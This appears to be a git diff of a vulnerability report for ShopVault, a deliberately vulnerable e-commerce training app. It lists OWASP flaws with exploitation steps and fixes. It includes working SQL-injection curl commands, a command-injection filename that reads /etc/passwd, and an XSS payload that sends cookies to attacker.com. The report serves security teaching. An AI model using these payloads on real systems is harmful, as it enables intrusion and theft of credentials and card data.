@@ -1,12 +1,13 @@
 # ShopVault — Vulnerability Report
 
-This document catalogs all intentionally introduced vulnerabilities in the ShopVault application. Each entry includes the OWASP Top 10:2021 category, file location, description, exploitation steps, and a fix in diff format.
+This document catalogs all intentionally introduced vulnerabilities in the ShopVault application. Each entry includes the OWASP Top 10:2025 category, file location, description, exploitation steps, and a fix in diff format.
 
 ---
 
-## A01 — Broken Access Control
+## A01:2025 — Broken Access Control
 
 ### A01-B1-IDOR-orders
+
 - **Category**: A01 — Broken Access Control
 - **Location**: `backend/internal/handlers/orders.go`, `Get()` method
 - **Description**: The `GET /api/orders/:id` endpoint does not verify that the authenticated user owns the requested order. Any authenticated user can view any order by enumerating the sequential order ID, exposing the full order details including credit card numbers.
@@ -15,6 +16,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Access `GET /api/orders/1` — receives admin's seed order or any other user's order
   3. Enumerate order IDs sequentially to extract all orders and their CC data
 - **Fix**:
+
 ```diff
  func (h *OrderHandler) Get(c *gin.Context) {
  	idStr := c.Param("id")
@@ -36,6 +38,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A01-B2-missing-admin-middleware
+
 - **Category**: A01 — Broken Access Control
 - **Location**: `backend/cmd/server/main.go`, admin route registration (`/api/admin/orders`)
 - **Description**: The `/api/admin/orders` route applies `AuthMiddleware` but NOT `AdminMiddleware`. Any authenticated user (even with `user` role) can access this endpoint and retrieve all orders with full credit card data from all users.
@@ -43,12 +46,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   1. Login as regular user (customer@example.com)
   2. `GET /api/admin/orders` — returns all orders including CC numbers
 - **Fix**:
+
 ```diff
 			admin.GET("/orders", middleware.AdminMiddleware(), adminHandler.GetOrders)
 -			admin.GET("/orders", adminHandler.GetOrders)
 ```
 
 ### A01-B3-user-profile-leak
+
 - **Category**: A01 — Broken Access Control
 - **Location**: `backend/internal/handlers/admin.go`, `GetUsers()` method
 - **Description**: The `GET /api/admin/users` endpoint returns all user fields including `password_hash` and `reset_token`. An admin user can retrieve password hashes (MD5) and active reset tokens for all users, enabling credential cracking and account takeover.
@@ -57,12 +62,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. `GET /api/admin/users`
   3. All users' MD5 password hashes and reset tokens are returned in the response
 - **Fix**:
+
 ```diff
 -	rows, err := database.DB.Query("SELECT id, email, password_hash, full_name, role, reset_token, created_at FROM users ORDER BY id")
 +	rows, err := database.DB.Query("SELECT id, email, full_name, role, created_at FROM users ORDER BY id")
 ```
 
 ### A01-F1-client-side-admin-routing
+
 - **Category**: A01 — Broken Access Control
 - **Location**: `frontend/src/App.tsx`, admin routes wrapped in `ProtectedRoute` (no role check)
 - **Description**: The client-side `/admin` routes are protected only by `ProtectedRoute`, which checks for authentication but NOT for admin role. Any authenticated user can see the admin UI, though API calls to admin-only endpoints will fail. This exposes the admin interface and allows non-admins to discover API endpoints.
@@ -71,6 +78,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Navigate to `/admin` — the admin dashboard renders
   3. Click around — `/admin/orders` endpoint responds successfully (see A01-B2)
 - **Fix**:
+
 ```diff
 +import { useAuth } from "../context/AuthContext";
 +
@@ -86,6 +94,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A01-F2-token-localstorage
+
 - **Category**: A01 — Broken Access Control
 - **Location**: `frontend/src/context/AuthContext.tsx`, stores JWT in localStorage
 - **Description**: The JWT token is stored in `localStorage`, which is accessible to any JavaScript running on the page. If the application has an XSS vulnerability (see A03-F1, A03-F2, A03-F3), an attacker can steal the token and impersonate the user.
@@ -94,6 +103,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Execute `console.log(localStorage.getItem("token"))` via XSS
   3. Use the stolen token to make API calls as the victim
 - **Fix**:
+
 ```diff
 -    localStorage.setItem("token", newToken);
 +    // Use httpOnly cookies set by the server instead of localStorage
@@ -102,9 +112,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A02 — Cryptographic Failures
+## A02:2025 — Cryptographic Failures
 
 ### A02-B1-md5-password
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `backend/internal/handlers/auth.go`, `hashPassword()` function
 - **Description**: Passwords are hashed using MD5 without a salt. MD5 is cryptographically broken and unsalted hashes are vulnerable to rainbow table attacks. The function is named `hashPassword()` which hides its weakness.
@@ -114,6 +125,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. The hash is a 32-character hex string (MD5)
   4. Look up the hash in rainbow tables or crack with common wordlists
 - **Fix**:
+
 ```diff
 +import "golang.org/x/crypto/bcrypt"
 
@@ -129,6 +141,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A02-B2-hardcoded-jwt-secret
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `backend/internal/handlers/auth.go` and `backend/internal/middleware/auth.go`, `jwtSecret` variable
 - **Description**: The JWT signing secret is hardcoded as `"shopvault-secret-key-2024"` in two places in the source code. Anyone with access to the code can forge valid JWT tokens for any user.
@@ -138,12 +151,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. Sign it with HMAC-SHA256 using the secret
   4. Use the forged token to access any protected endpoint
 - **Fix**:
+
 ```diff
 -var jwtSecret = []byte("shopvault-secret-key-2024")
 +var jwtSecret = []byte(os.Getenv("JWT_SECRET"))
 ```
 
 ### A02-B3-jwt-none-algorithm
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Me()` method and `backend/internal/middleware/auth.go`, `AuthMiddleware()`
 - **Description**: The JWT parsing does not enforce a specific signing algorithm. Both the `/api/auth/me` handler and the `AuthMiddleware` use `jwt.Parse()` without specifying valid methods. Depending on the jwt library version, this may allow the `"alg": "none"` attack where a token with no signature is accepted as valid.
@@ -152,6 +167,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Set the signature to an empty string
   3. Use `Authorization: Bearer <crafted-token>` to access any protected endpoint
 - **Fix**:
+
 ```diff
 -		token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
 -			return jwtSecret, nil
@@ -165,6 +181,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A02-B4-plaintext-cc
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `backend/internal/database/db.go`, orders table schema; `backend/internal/handlers/cart.go`, `Checkout()` method
 - **Description**: Credit card numbers (`cc_number`), expiry dates (`cc_expiry`), and CVV codes (`cc_cvv`) are stored as plaintext in the `orders` table and returned in API responses. There is no encryption at rest. Anyone with database access or who exploits IDOR/access control vulnerabilities can read full payment card data.
@@ -174,6 +191,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. Or access via IDOR: `GET /api/orders/1`
   4. Full CC data is returned in the response
 - **Fix**:
+
 ```diff
 +// Encrypt CC data before storing
 +import "crypto/aes"
@@ -189,6 +207,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A02-B5-predictable-reset-token
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `backend/internal/handlers/auth.go`, `ForgotPassword()` method
 - **Description**: The password reset token is generated as `md5(email + "reset" + date)`. The token is a deterministic MD5 hash using only the email (public) and the current date (easily guessable within a 24-hour window). An attacker who knows a user's email can generate the reset token and take over the account.
@@ -198,12 +217,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. `POST /api/auth/reset-password` with the computed token and a new password
   4. Account taken over
 - **Fix**:
+
 ```diff
 -	resetToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%sreset%s", user.Email, now.Format("2006-01-02")))))
 +	resetToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%sreset%s%d", user.Email, now.Format("2006-01-02"), rand.Int63()))))
 ```
 
 ### A02-F1-jwt-localstorage
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `frontend/src/context/AuthContext.tsx`, stores JWT in localStorage
 - **Description**: (See A01-F2 — dual-category) The JWT is stored in localStorage, making it accessible to XSS attacks. Combined with A03 vulnerabilities, this enables complete token theft.
@@ -211,6 +232,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Fix**: Same as A01-F2
 
 ### A02-F2-cvv-unmasked
+
 - **Category**: A02 — Cryptographic Failures
 - **Location**: `frontend/src/pages/Checkout.tsx`, CVV input field
 - **Description**: The CVV/CVC input field uses `type="text"` instead of `type="password"`, meaning the entered value is visible on screen. Additionally, the checkout form data including full CC details is logged to the browser console (see A09-F2).
@@ -219,6 +241,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Observe the CVV displayed in plaintext
   3. Open browser DevTools → Console to see the full CC payload
 - **Fix**:
+
 ```diff
                  <input
 -                  type="text"
@@ -230,13 +253,15 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A03 — Injection
+## A03:2025 — Injection
 
 ### A03-B1-sqli-product-search
+
 - **Category**: A03 — Injection
 - **Location**: `backend/internal/handlers/products.go`, `Search()` method
 - **Description**: The product search endpoint concatenates user input directly into a SQL query using `fmt.Sprintf` to build a LIKE clause. A malicious search query can inject SQL commands, allowing data extraction, modification, or deletion.
 - **Exploitation**:
+
   ```bash
   # Extract all table names
   curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+1,name,3,4,5,6,7+FROM+sqlite_master+WHERE+type='table'--"
@@ -244,7 +269,9 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   # Bypass authentication by extracting user data
   curl "http://localhost:8080/api/products/search?q='+UNION+SELECT+id,email,password_hash,full_name,5,6,7+FROM+users--"
   ```
+
 - **Fix**:
+
 ```diff
 -	q := fmt.Sprintf(
 -		"SELECT id, name, description, price, image_url, category, stock FROM products WHERE name LIKE '%%%s%%' OR description LIKE '%%%s%%'",
@@ -259,10 +286,12 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A03-B2-sqli-login
+
 - **Category**: A03 — Injection
 - **Location**: `backend/internal/handlers/auth.go`, `Login()` method
 - **Description**: The login handler builds the SQL query using `fmt.Sprintf` with the user-provided email directly interpolated. An attacker can use SQL injection to bypass authentication entirely.
 - **Exploitation**:
+
   ```bash
   # Login as admin without password
   curl -X POST http://localhost:8080/api/auth/login \
@@ -274,7 +303,9 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
     -H 'Content-Type: application/json' \
     -d '{"email": "'\'' OR 1=1--", "password": "anything"}'
   ```
+
 - **Fix**:
+
 ```diff
 -	query := fmt.Sprintf(
 -		"SELECT id, email, password_hash, full_name, role FROM users WHERE email = '%s'",
@@ -288,10 +319,12 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A03-B3-sqli-admin-order-filter
+
 - **Category**: A03 — Injection
 - **Location**: `backend/internal/handlers/admin.go`, `GetOrders()` method
 - **Description**: The admin orders endpoint filters by `user_id` or `status` parameters using `fmt.Sprintf` for SQL query construction. Both the numeric `user_id` and string `status` parameters are directly interpolated without sanitization.
 - **Exploitation**:
+
   ```bash
   # Extract other tables via UNION
   curl -H "Authorization: Bearer <token>" \
@@ -301,7 +334,9 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   curl -H "Authorization: Bearer <token>" \
     "http://localhost:8080/api/admin/orders?status=pending'+OR+1=1--"
   ```
+
 - **Fix**:
+
 ```diff
 -		query := fmt.Sprintf(
 -			"SELECT ... FROM orders WHERE user_id = %s",
@@ -315,6 +350,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A03-B4-command-injection
+
 - **Category**: A03 — Injection
 - **Location**: `backend/internal/handlers/upload.go`, `processImage()` function
 - **Description**: After an image file is uploaded (with admin privileges), the `processImage()` function constructs an ImageMagick `convert` command via shell (`sh -c`) using the unsanitized filename. A malicious filename like `test;cat /etc/passwd > /app/uploads/passwd.txt;.jpg` would execute arbitrary shell commands on the server.
@@ -323,12 +359,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Upload a file with filename: `test; id > /app/uploads/output.txt; .jpg`
   3. `GET /uploads/output.txt` — the command output is accessible
 - **Fix**:
+
 ```diff
 -		cmd := exec.Command("sh", "-c", fmt.Sprintf("convert %s -resize 300x300 %s", filename, outputFile))
 +		cmd := exec.Command("convert", filename, "-resize", "300x300", outputFile)
 ```
 
 ### A03-B5-ssti-email-template
+
 - **Category**: A03 — Injection
 - **Location**: `backend/internal/templates/email.go`, `RenderReceipt()` function
 - **Description**: The email receipt function uses `text/template` to render an order confirmation. The `ShippingAddress` field from the user's checkout request is interpolated directly into the template string using `fmt.Sprintf`. If the shipping address contains Go template syntax like `{{.Total}}`, it will be evaluated when the template is executed, allowing server-side template injection.
@@ -337,6 +375,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. The template engine evaluates the injected directives
   3. Internal order data is exposed in the rendered output
 - **Fix**:
+
 ```diff
 -	bodyText := fmt.Sprintf(`Order Confirmation #%d
 -...
@@ -360,6 +399,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A03-F1-reflected-xss-search
+
 - **Category**: A03 — Injection
 - **Location**: `frontend/src/pages/Shop.tsx`, search result rendering
 - **Description**: The search query parameter is rendered into the page using `dangerouslySetInnerHTML` without any sanitization. An attacker can craft a URL with a malicious search query that executes arbitrary JavaScript in the victim's browser.
@@ -368,12 +408,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Send the URL to a victim
   3. When the victim opens the URL, the XSS payload executes
 - **Fix**:
+
 ```diff
 -        <span dangerouslySetInnerHTML={{ __html: searchParams.get("q") || "" }} />
 +        <span>{searchParams.get("q") || ""}</span>
 ```
 
 ### A03-F2-stored-xss-reviews
+
 - **Category**: A03 — Injection
 - **Location**: `frontend/src/pages/ProductDetail.tsx`, review comment rendering
 - **Description**: Review comments are rendered using `dangerouslySetInnerHTML` without sanitization. An attacker can submit a review containing HTML/JavaScript that will execute when any user views the product page. This is a stored XSS affecting all visitors.
@@ -382,12 +424,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Submit a review with comment: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
   3. When any user (including admin) views the product, the script executes
 - **Fix**:
+
 ```diff
 -            <p dangerouslySetInnerHTML={{ __html: review.comment }} />
 +            <p>{review.comment}</p>
 ```
 
 ### A03-F3-dom-xss-hash
+
 - **Category**: A03 — Injection
 - **Location**: `frontend/src/pages/Shop.tsx`, hash-based DOM manipulation
 - **Description**: The page reads `window.location.hash` and directly assigns it to an element's `innerHTML`. An attacker can craft a URL with a malicious hash fragment that executes JavaScript in the victim's browser.
@@ -396,6 +440,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Send to victim
   3. The hash content is injected into the DOM and the XSS fires
 - **Fix**:
+
 ```diff
 -      if (hash) {
 -        const el = document.getElementById("preview-area");
@@ -413,9 +458,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A04 — Insecure Design
+## A04:2025 — Insecure Design
 
 ### A04-B1-client-side-price
+
 - **Category**: A04 — Insecure Design
 - **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method
 - **Description**: The checkout endpoint accepts client-provided prices for each cart item without verifying them against the database. An attacker can modify the price in the request to pay an arbitrary amount for any product.
@@ -434,6 +480,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   ```
   Order is created with total $0.01 instead of $149.99.
 - **Fix**:
+
 ```diff
  	total := 0.0
  	for _, item := range req.Items {
@@ -445,6 +492,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A04-B2-negative-quantity
+
 - **Category**: A04 — Insecure Design
 - **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method
 - **Description**: The checkout endpoint does not validate that the quantity of each item is positive. Setting a negative quantity results in a negative total, effectively crediting the user's "purchase."
@@ -460,6 +508,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   ```
   Order total is -$749.95.
 - **Fix**:
+
 ```diff
 +	if item.Quantity <= 0 {
 +		c.JSON(http.StatusBadRequest, gin.H{"error": "Quantity must be positive"})
@@ -468,6 +517,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A04-B3-coupon-race-condition
+
 - **Category**: A04 — Insecure Design
 - **Location**: `backend/internal/handlers/cart.go`, `Checkout()` method and `backend/internal/handlers/coupons.go`, `Validate()` method
 - **Description**: Coupon usage validation uses a read-check-write pattern without a database transaction. Two concurrent requests can both pass the `used_count < max_uses` check before either increments the counter, allowing the coupon to be used more than `max_uses` times.
@@ -476,6 +526,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Send 10 concurrent checkout requests using the same coupon code
   3. Multiple orders successfully apply the coupon discount
 - **Fix**:
+
 ```diff
 -		if coupon.UsedCount < coupon.MaxUses {
 -			database.DB.Exec("UPDATE coupons SET used_count = used_count + 1 WHERE id = ?", coupon.ID)
@@ -493,6 +544,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A04-F1-client-total-calculation
+
 - **Category**: A04 — Insecure Design
 - **Location**: `frontend/src/pages/Cart.tsx`, total calculation
 - **Description**: The cart total is calculated on the client side using `items.reduce()`. While the server side is also vulnerable (A04-B1), performing business logic on the client introduces an architectural flaw. The calculated total may not match the server-side total that the backend processes.
@@ -500,6 +552,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 - **Fix**: Calculate totals exclusively on the server; the client should only display what the server returns.
 
 ### A04-F2-client-coupon-discount
+
 - **Category**: A04 — Insecure Design
 - **Location**: `frontend/src/pages/Cart.tsx` and `frontend/src/pages/Checkout.tsx`, client-side coupon application
 - **Description**: The coupon discount is calculated on the client side and the discounted total is sent to the server. The client controls the discount logic, enabling arbitrary price manipulation.
@@ -508,9 +561,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A05 — Security Misconfiguration
+## A05:2025 — Security Misconfiguration
 
 ### A05-B1-gin-debug-mode
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `docker-compose.yml`, `GIN_MODE=debug` environment variable
 - **Description**: The Gin framework runs in debug mode in the Docker Compose setup. Debug mode prints every request to stdout, including sensitive headers and request bodies. In production, this would leak sensitive data (passwords, tokens, credit card numbers) into container logs.
@@ -519,12 +573,14 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Check Docker logs: `docker compose logs backend`
   3. The password is logged in plaintext (see also A09-B1)
 - **Fix**:
+
 ```diff
 -      - GIN_MODE=debug
 +      - GIN_MODE=release
 ```
 
 ### A05-B2-default-credentials
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `backend/internal/database/seed.go`, admin user seed data
 - **Description**: A default admin account is seeded with credentials `admin@shopvault.com` / `admin123`. These credentials are documented in the README and hardcoded in the seed data. Anyone who discovers the application can log in with administrative privileges.
@@ -532,6 +588,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   1. Read the README or source code to find the default credentials
   2. Login with `admin@shopvault.com` / `admin123`
 - **Fix**:
+
 ```diff
 -	_, err = database.DB.Exec(
 -		"INSERT INTO users (email, password_hash, full_name, role) VALUES (?, ?, ?, ?)",
@@ -542,18 +599,21 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A05-B3-directory-listing
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `backend/cmd/server/main.go`, static file serving configuration
 - **Description**: The `/uploads/` directory is served using `r.StaticFS("/uploads", http.Dir("./uploads"))` which enables directory listing. Anyone can browse the file listing at `/uploads/` and discover all uploaded files including potentially malicious content.
 - **Exploitation**:
   1. `GET http://localhost:8080/uploads/` — lists all files in the uploads directory
 - **Fix**:
+
 ```diff
 -	r.StaticFS("/uploads", http.Dir("./uploads"))
 +	r.Static("/uploads", "./uploads")
 ```
 
 ### A05-B4-error-stack-traces
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: Multiple handlers across the backend
 - **Description**: Error responses return the raw Go error message via `c.JSON(500, gin.H{"error": err.Error()})`. In debug mode, Gin may also include stack traces in error responses, leaking internal application structure to clients.
@@ -561,6 +621,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   1. Trigger an error (e.g., malformed JSON, invalid parameter)
   2. The response contains detailed error information including internal paths
 - **Fix**:
+
 ```diff
 -	c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 +	log.Printf("Internal error: %v", err)
@@ -568,6 +629,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A05-B5-missing-security-headers
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `backend/cmd/server/main.go`, Gin router initialization
 - **Description**: The application does not set any security-related HTTP headers: no Content-Security-Policy, no X-Frame-Options, no X-Content-Type-Options, no Strict-Transport-Security. This leaves the application vulnerable to clickjacking, MIME-type sniffing, and inline script injection.
@@ -576,6 +638,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. No CSP, X-Frame-Options, or other security headers are present
   3. Combined with XSS (A03), no defense-in-depth exists
 - **Fix**:
+
 ```diff
 +	r.Use(func(c *gin.Context) {
 +		c.Header("Content-Security-Policy", "default-src 'self'; script-src 'self'")
@@ -587,17 +650,20 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A05-F1-no-csp
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `frontend/index.html`, missing Content-Security-Policy meta tag or header
 - **Description**: The frontend does not include a CSP header or meta tag. Together with A05-B5 (no CSP from backend), this allows any inline scripts to execute, making XSS attacks trivially exploitable.
 - **Exploitation**:
   1. Any XSS payload (see A03-F1, A03-F2, A03-F3) executes without restriction
 - **Fix**:
+
 ```diff
 +	<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' https://cdn.jsdelivr.net">
 ```
 
 ### A05-F2-source-maps
+
 - **Category**: A05 — Security Misconfiguration
 - **Location**: `frontend/vite.config.ts`, build configuration
 - **Description**: Source maps are enabled in the production build (`sourcemap: true`). This exposes the original TypeScript source code to anyone who visits the site, revealing implementation details, API endpoints, and internal logic.
@@ -606,6 +672,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Open DevTools → Sources
   3. Original `.tsx` source files are visible, including API routes and token handling logic
 - **Fix**:
+
 ```diff
    build: {
 -    sourcemap: true,
@@ -615,9 +682,10 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 
 ---
 
-## A06 — Vulnerable and Outdated Components
+## A06:2025 — Software Supply Chain Failures
 
 ### A06-B1-outdated-go-dependencies
+
 - **Category**: A06 — Vulnerable and Outdated Components
 - **Location**: `backend/go.mod`
 - **Description**: The Go module uses outdated dependency versions with known vulnerabilities:
@@ -626,6 +694,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   - `github.com/mattn/go-sqlite3 v1.14.15` (contains known bugs)
 - **Exploitation**: These versions contain known CVEs that can be exploited.
 - **Fix**:
+
 ```diff
 -	github.com/gin-gonic/gin v1.7.0
 -	github.com/golang-jwt/jwt/v4 v4.0.0
@@ -636,22 +705,26 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A06-B2-outdated-go-image
+
 - **Category**: A06 — Vulnerable and Outdated Components
 - **Location**: `Dockerfile.backend`, base image
 - **Description**: The Dockerfile uses `golang:1.20-alpine` as the base image. Go 1.20 is no longer supported and contains unpatched security vulnerabilities in the standard library and runtime.
 - **Exploitation**: Known vulnerabilities in Go standard library packages (net/http, crypto/tls, etc.).
 - **Fix**:
+
 ```diff
 -FROM golang:1.20-alpine
 +FROM golang:1.22-alpine
 ```
 
 ### A06-F1-outdated-react
+
 - **Category**: A06 — Vulnerable and Outdated Components
 - **Location**: `frontend/package.json`
 - **Description**: The frontend uses outdated versions of React (18.0.0), Vite (2.9.0), and other dependencies. These versions may contain known security vulnerabilities.
 - **Exploitation**: Known React vulnerabilities (e.g., CVE-2021-24033, CVE-2020-15973) present in React 18.0.0.
 - **Fix**:
+
 ```diff
 -    "react": "^18.0.0",
 -    "react-dom": "^18.0.0",
@@ -662,21 +735,75 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A06-F2-outdated-node-image
+
 - **Category**: A06 — Vulnerable and Outdated Components
 - **Location**: `Dockerfile.frontend`, base image
 - **Description**: The Dockerfile uses `node:18-alpine`. Node 18 reached end-of-life and receives no security updates.
 - **Exploitation**: Known vulnerabilities in Node.js 18.
 - **Fix**:
+
 ```diff
 -FROM node:18-alpine
 +FROM node:22-alpine
 ```
 
+### A06:2025-B3-frontend-container-root
+
+- **Category**: A06:2025 — Software Supply Chain Failures
+- **Location**: `Dockerfile.frontend`, base image configuration
+- **Severity**: Medium
+- **Description**: The frontend Dockerfile does not specify a `USER` directive, causing the container to run as root. In contrast, the backend Dockerfile uses `USER app`. If the frontend is compromised (e.g., via XSS, dependency backdoor, or prototype pollution), the attacker gains root-level access within the container and can pivot to other containers on the same Docker network.
+- **Exploitation**:
+  1. Exploit any XSS vulnerability (A03-F1, F2, F3) to execute code in the container
+  2. The code runs as root (`id` returns `uid=0(root)`)
+  3. Install tools (`apt-get update && apt-get install -y curl`), scan the network for the backend (`nmap shopvault-backend`), or exfiltrate data
+- **Fix**:
+
+```diff
++FROM node:20-alpine
++RUN addgroup -S appgroup && adduser -S appuser -G appgroup
++USER appuser
+```
+
+### A06:2025-B4-no-dependency-scanning
+
+- **Category**: A06:2025 — Software Supply Chain Failures
+- **Location**: Entire repository — absence of CI/CD security scanning
+- **Severity**: Medium
+- **Description**: The project has no automated dependency vulnerability scanning pipeline. There are no GitHub Actions workflows (no `.github/workflows/`), no `Makefile` security targets, no `govulncheck` integration, and no `npm audit` in the build process. Combined with outdated dependencies (A06:2025-B1, A06:2025-F1), known CVEs remain undetected indefinitely. Even if dependencies are manually updated, new vulnerabilities in those updated packages will go unnoticed.
+- **Exploitation**: Attackers actively scan for known CVEs in dependency versions. ShopVault's gin v1.7.0 and react 18.0.0 have publicly known vulnerabilities that can be discovered via automated tools.
+- **Fix**:
+
+```diff
++# .github/workflows/security.yml
++name: Security Scan
++on: [push, pull_request]
++jobs:
++  go-vulncheck:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v4
++      - uses: golang/govulncheck-action@v1
++  npm-audit:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@v4
++      - run: cd frontend && npm audit --audit-level=high
++  docker-scan:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: aquasecurity/trivy-action@master
++        with:
++          scan-type: 'fs'
++          scan-ref: '.'
+```
+
 ---
 
-## A07 — Identification and Authentication Failures
+## A07:2025 — Identification and Authentication Failures
 
 ### A07-B1-weak-session-token
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Login()` method
 - **Description**: Session tokens are generated as `md5(email + timestamp)` where the timestamp is `time.Now().UnixNano()`. While this is at nanosecond resolution, the entropy is limited to 64 bits, and the token is predictable if the approximate login time is known.
@@ -685,6 +812,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   2. Brute-force the nanosecond timestamp within a small window
   3. Generate the corresponding session token
 - **Fix**:
+
 ```diff
 -	sessionToken := fmt.Sprintf("%x", md5.Sum([]byte(fmt.Sprintf("%s%d", user.Email, time.Now().UnixNano()))))
 +	import "crypto/rand"
@@ -694,6 +822,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A07-B2-no-password-policy
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Register()` and `ResetPassword()` methods
 - **Description**: There are no password complexity requirements. A user can register with a single-character password. The `Register()` handler only checks that the password is non-empty.
@@ -701,6 +830,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   1. Register with password "a"
   2. The account is created successfully
 - **Fix**:
+
 ```diff
  	if req.Email == "" || req.Password == "" || req.FullName == "" {
  		c.JSON(http.StatusBadRequest, gin.H{"error": "All fields are required"})
@@ -713,6 +843,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A07-B3-jwt-no-expiry
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: `backend/internal/handlers/auth.go`, `Login()` method
 - **Description**: The JWT token is generated without an `exp` (expiration) claim. Once issued, the token is valid indefinitely. If a token is stolen (e.g., via XSS — see A03), it can be used forever.
@@ -722,6 +853,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   3. Observe that there is no `exp` field
   4. The stolen token can be reused indefinitely
 - **Fix**:
+
 ```diff
  	claims := jwt.MapClaims{
  		"user_id": user.ID,
@@ -732,6 +864,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
 
 ### A07-B4-no-rate-limiting
+
 - **Category**: A07 — Identification and Authentication Failures
 - **Location**: Entire backend — absence of rate limiting middleware
 - **Description**: There is no rate limiting on any endpoint, including login, registration, and password reset. Attackers can brute-force credentials or enumerate users (see A07-B5) without any automated defense.
@@ -739,6 +872,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
   1. Write a script to send 1000 login attempts per second
   2. No rate limiting or lockout mechanism slows the attack
 - **Fix**:
+
 ```diff
 +// Add rate limiting middleware
 +import "golang.org/x/time/rate"
@@ -746,6 +880,7 @@ This document catalogs all intentionally introduced vulnerabilities in the ShopV
 ```
